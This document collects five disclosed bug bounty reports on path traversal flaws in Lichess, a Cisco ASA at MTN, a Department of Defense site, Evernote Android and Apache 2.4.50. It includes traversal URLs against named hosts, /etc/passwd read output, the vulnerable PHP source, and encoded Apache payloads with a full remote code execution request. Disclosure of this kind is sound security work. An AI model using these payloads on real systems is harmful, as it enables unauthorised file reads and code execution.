# Path Traversal: '.../...//'

_5 reports — High/Critical, disclosed_

### [Path Traversal Vulnerability in Lila Project](https://hackerone.com/reports/3181066)

- **Report ID:** `3181066`
- **Severity:** High
- **Weakness:** Path Traversal: '.../...//'
- **Program:** Lichess
- **Reporter:** @immm
- **Bounty:** - usd
- **Disclosed:** 2025-06-09T11:30:57.294Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A path traversal vulnerability was discovered in the Lila project that allows an attacker to access arbitrary files on the server by manipulating user-supplied input to traverse outside the intended directory structure. This flaw could potentially expose sensitive files such as application source code, configuration files, or other data not meant for public access.

## Steps To Reproduce:
[add details for how we can reproduce the issue]
code url
lila-master/conf/routes,line 939
{F4420388}
poc
https://lichess.org/assets/../build.sbt
{F4420380}
https://lichess.org/assets/../.git/config
{F4420382}

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

The path traversal vulnerability in the Lila project could lead to:
Arbitrary file read: An attacker could access sensitive files such as:
.git/config, revealing repository structure and remote URLs
application.conf or similar, leaking secrets, DB credentials, or API keys
Server-side source files, enabling reverse engineering or bug discovery
Information disclosure: Internal logic, credentials, deployment details, or admin-only configurations may be exposed.
Privilege escalation (indirectly): By reading files related to user tokens or access control, an attacker might craft further exploits.
Recon for further attacks: Knowledge of internal file structure aids in targeting further vulnerabilities like RCE or IDOR.

---

### [CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on [mtn.co.ug]](https://hackerone.com/reports/2375666)

- **Report ID:** `2375666`
- **Severity:** Critical
- **Weakness:** Path Traversal: '.../...//'
- **Program:** MTN Group
- **Reporter:** @deb0con
- **Bounty:** - usd
- **Disclosed:** 2024-08-30T16:28:37.850Z
- **CVE(s):** CVE-2018-0296

**Vulnerability Information:**

## Summary:
A vulnerability in the web interface of the Cisco Adaptive Security Appliance (ASA) could allow an unauthenticated, remote attacker to cause an affected device to reload unexpectedly, resulting in a denial of service (DoS) condition. It is also possible on certain software releases that the ASA will not reload, but an attacker could view sensitive system information without authentication by using directory traversal techniques. The vulnerability is due to lack of proper input validation of the HTTP URL. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. An exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information. This vulnerability applies to IPv4 and IPv6 HTTP traffic. This vulnerability affects Cisco ASA Software and Cisco Firepower Threat Defense (FTD) Software that is running on the following Cisco products: 3000 Series Industrial Security Appliance (ISA), ASA 1000V Cloud Firewall, ASA 5500 Series Adaptive Security Appliances, ASA 5500-X Series Next-Generation Firewalls, ASA Services Module for Cisco Catalyst 6500 Series Switches and Cisco 7600 Series Routers, Adaptive Security Virtual Appliance (ASAv), Firepower 2100 Series Security Appliance, Firepower 4100 Series Security Appliance, Firepower 9300 ASA Security Module, FTD Virtual (FTDv). 


## Proof of concept
**Vulnerability Host Server :** https://h27da.n1.ips.mtn.co.ug/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
 1. Navigate intercept request to burp-suite `h27da.n1.ips.mtn.co.ug/+CSCOU+/../+CSCOE+/files/file_list.json`
 1. See the PoCs Screenshots of vulnerable bellow 

{F3053186}

{F3053187}


## Supporting Material/References:
  * https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd
  * https://nvd.nist.gov/vuln/detail/CVE-2018-0296
  * https://hackerone.com/reports/378698
  * https://hackerone.com/reports/377542
  * https://hackerone.com/reports/622864

## Impact

High - This vulnerability allows the attacker to browse files past the authentication and disclose sensitive information.

---

### [Local file read at https://████/ [HtUS]](https://hackerone.com/reports/1626210)

- **Report ID:** `1626210`
- **Severity:** Critical
- **Weakness:** Path Traversal: '.../...//'
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sudi
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T13:51:37.555Z
- **CVE(s):** -

**Vulnerability Information:**

Heyy there,
I have found local file read vulnerability in your website https://█████/

This the vulnerable endpoint https://██████████/download.php?filePathDownload=data_products and the `filePathDownload` path is vulnerable which allows an attacker to read any local files.

There was some sort protection when I first checked this endpoint, as it was returning 403 forbidden status code, upon trying something similar as the hacker has shown in report #1542734 . But I was able to bypass the protection in place.


---------------------

**Steps to reproduce:**

Just visit this url , which will display the contents of the `/etc/passwd` file:

https://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd


Response:

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:998:995::/var/lib/chrony:/sbin/nologin
ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sssd:x:995:993:User for sssd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sustainment:x:1001:1001::/home/sustainment:/bin/bash
emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash
cwagent:x:993:992::/home/cwagent:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
drupal:x:1004:1005::/home/drupal:/bin/bash
splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash
mfe:x:992:1007::/home/mfe:/sbin/nologin
aoc:x:991:991:AWS OTel Collector:/home/aoc:/sbin/nologin
```



Also the content of `/etc/hosts`

```
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6

████ ███████
████████
███████
███████
█████████
██████████
████████

```



You can also read the source code for the available php files such as index.php,download.php

Here's the source code for `download.php`
https://█████/download.php?filePathDownload=data_products/../download.php

```php
<?php

function checkPath($path){

  if(!contains($path, "data_products")){

    ob_clean();
    http_response_code(403);
	throw new RuntimeException('File Not Found Error');  
    exit();
    
  }
		
	
}

function startsWith( $haystack, $needle ) {
     $length = strlen( $needle );
     return substr( $haystack, 0, $length ) === $needle;
}

function contains( $haystack, $needle ) {
     return strpos($haystack, $needle) !== false;
}

if(isset($_REQUEST["file"]) && isset($_REQUEST['linkpath'])){
 $linkpath=$_REQUEST['linkpath'];
    echo $file = htmlspecialchars(urldecode(base64_decode($_REQUEST["file"]))); // Decode URL-encoded string
    echo   $filepath =  $linkpath.'/'.$file;
    checkPath($filepath);
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                   //header('Content-Type: application/pdf');
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}
if(isset($_REQUEST["filedownload"])){

   echo  $filepath = htmlspecialchars(urldecode(base64_decode($_REQUEST["filedownload"]))); // Decode URL-encoded string
   die;//  $filepath = $_REQUEST["filedownload"];
   checkPath($filepath);
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}

if(isset($_REQUEST["filePathDownload"])){

   echo  $filepath = htmlspecialchars(urldecode($_REQUEST["filePathDownload"]));
    checkPath($filepath);
     
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}

?>
```


-----------------

## Impact

Impact:

An attacker can read any local files,I haven't looked much into the local files but as there many users in the system I might be able to get access to something very sensitive.

Thankyou
Regards
Sudhanshu

---

### [2 click Remote Code execution in Evernote Android](https://hackerone.com/reports/1377748)

- **Report ID:** `1377748`
- **Severity:** High
- **Weakness:** Path Traversal: '.../...//'
- **Program:** Evernote
- **Reporter:** @hulkvision_
- **Bounty:** - usd
- **Disclosed:** 2022-03-29T13:54:09.372Z
- **CVE(s):** -

**Vulnerability Information:**

This vulnerability is similar to my previous reported vulnerability #1362313 , in here also weakness is path transversal  vulnerability which helps me to acheive code execution but the root cause is different.

some part of this app is written in java and some parts are written in react native. 

In evernote we can share notes and notebooks with others. In  notes we can also add attachments and there is option to rename the added attachment. When renaming i founded that special characters are not restricted,for example file uploaded with name `libjnigraphics.so`  can be renamed to `../../../lib-1/libjnigraphics.so` and when the attachment is downloaded it is downloaded with filename `../../../lib-1/libjnigraphics.so`.
The evernote android app also does not sanitize the received filename, so when user clicks on attachment,instead of attachment getting downloaded in `/data/data/com.evernote/cache/preview/:UUID/` this directory it is downloaded into   `/data/data/com.evernote/lib-1/libjnigraphics.so` which results into remote code execution.

> #1362313 report vulnerability root cause was that the app was not sanatizing the value of `_display_name ` from the provider of received `content://` uri that  resulted into ACE.

> This report's  root cause is that app is extracting attachment filename from `content-disposition` header  eg:- `content-disposition: attachment; filename="../../../lib-1/libjnigraphics.so"`  and the evernote app is  not sanatizing the received filename from the response header. 
The attachment download logic is written in react-native and the source file is compiled into hermes javascript bytecode, so i am not able to show the exact vulnerable code like i did in my last report.

The conclusion i reached was that fixing this report #1362313 bug will not fix this vulnerability so i am writing a new report.




## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Add the native-library poc file to a note {F1489257}
  2. Rename the attachment to `../../../lib-1/libjnigraphics`.
  2. Invite the victim to your note.

  Step 2 is needed,i don't know why `Shareable link` feature is not working on evernote android app without sending an invitation
 3. Click on 3 dots > copy internal link > copy web link OR copy app link(which is android deeplink and can be triggred from websites)
 4. Send link to victim and open the link (1st click)
 5. Click on attachment when note is opened (2nd click)
 6. Close the evernote app and open it again.
From adb shell run nc 127.0.0.1 6666
* use physical device because i have provided the arm64 architecture native library

>POC VIDEO
{F1489256}

## Impact

remote code execution in evernote android app with 2 clicks.

---

### [Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50](https://hackerone.com/reports/1404731)

- **Report ID:** `1404731`
- **Severity:** Critical
- **Weakness:** Path Traversal: '.../...//'
- **Program:** Internet Bug Bounty
- **Reporter:** @itsecurityco
- **Bounty:** 1000 usd
- **Disclosed:** 2021-11-19T23:45:37.511Z
- **CVE(s):** CVE-2021-42013

**Vulnerability Information:**

Hello Apache team,

@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.

These are the payloads:

1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65

PoC Path Traversal

GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

PoC RCE

POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: "2aa6-5cda88e8a6005-gzip"
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M

## Impact

An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

**Summary (team):**

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

Acknowledgements:

Reported by Juan Escobar from Dreamlab Technologies
Reported by Fernando Muñoz from NULL Life CTF Team
Reported by Shungo Kumasaka
Reported by Nattapon Jongcharoen

Reported to security team: 2021-10-06
fixed by r1893977, r1893980, r1893982 in 2.4.x: 2021-10-07
Update 2.4.51 released: 2021-10-07
Affects: 2.4.50, 2.4.49

https://httpd.apache.org/security/vulnerabilities_24.html

---
